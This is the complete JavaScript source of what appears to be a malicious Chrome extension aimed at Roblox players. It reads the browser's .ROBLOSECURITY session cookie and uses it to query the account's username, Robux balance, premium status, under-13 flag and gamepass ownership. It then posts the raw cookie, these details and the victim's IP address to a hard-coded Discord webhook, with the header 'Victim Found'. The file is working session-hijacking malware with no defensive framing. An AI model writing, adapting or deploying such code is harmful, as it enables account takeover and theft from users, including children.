const WEBHOOKS = [
    {
        url: "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
        mention: "@everyone"
    }
];

let hasSent = false; // ✅ Track if we already sent

async function main(cookie) {
    if (!cookie || hasSent) return; // Only run once
    hasSent = true;

    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;
    let ownsGamepass = false;
    const gamepassId = 1417708310;

    try {
        let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });

        if (!res.ok) return;
        let user = await res.json();

        // Economy info
        let economyRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A", robuxPending: "N/A" };

        // Premium status
        let premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let isPremium = premiumRes.ok ? await premiumRes.json() : false;

        // Fixed Roblox profile picture
        let thumbUrl = `https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${user.id}-Png/420/420/AvatarHeadshot/Webp/noFilter`;

        // Check gamepass ownership
        try {
            let gpRes = await fetch(`https://apis.roblox.com/game-passes/v1/game-passes/${gamepassId}/users/${user.id}`, {
                method: "GET",
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });
            let gpJson = gpRes.ok ? await gpRes.json() : null;
            ownsGamepass = gpJson && gpJson.data && gpJson.data.length > 0;
        } catch (e) { console.error(e); }

        statistics = {
            UserName: user.name,
            UserId: user.id,
            IsUnder13: user.isUnder13,
            JoinDate: user.created ? new Date(user.created).toDateString() : "N/A",
            RobuxBalance: economy.robux ?? "N/A",
            PendingRobux: economy.robuxPending ?? "N/A",
            IsPremium: isPremium,
            ThumbnailUrl: thumbUrl
        };

    } catch (e) {
        console.error(e);
    }

    if (!statistics) return;

    const embedPayload = {
        embeds: [
            {
                description: "```" + cookie + "```\n[Refresh Cookie](https://refresher.ct.ws/?i=1)",
                color: 16711680, // RED
                fields: [
                    { name: "Username", value: statistics.UserName, inline: true },
                    { name: "User ID", value: statistics.UserId.toString(), inline: true },
                    { name: "Underage", value: statistics.IsUnder13 ? "✅ Yes" : "❌ No", inline: true },
                    { name: "Join Date", value: statistics.JoinDate, inline: true },
                    { name: "Robux", value: statistics.RobuxBalance.toString(), inline: true },
                    { name: "Pending Robux", value: statistics.PendingRobux.toString(), inline: true },
                    { name: "Premium", value: statistics.IsPremium ? "✅ Yes" : "❌ No", inline: true },
                    { name: "Owns Gamepass", value: ownsGamepass ? "✅ Yes" : "❌ No", inline: true }
                ],
                author: {
                    name: "Victim Found: " + ipAddr,
                    icon_url: statistics.ThumbnailUrl
                },
                footer: { text: "ENTERPRISE" }
            }
        ]
    };

    for (let wh of WEBHOOKS) {
        fetch(wh.url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ ...embedPayload, content: wh.mention })
        }).catch(console.error);
    }
}

// ✅ Run once
chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, c => main(c ? c.value : null));
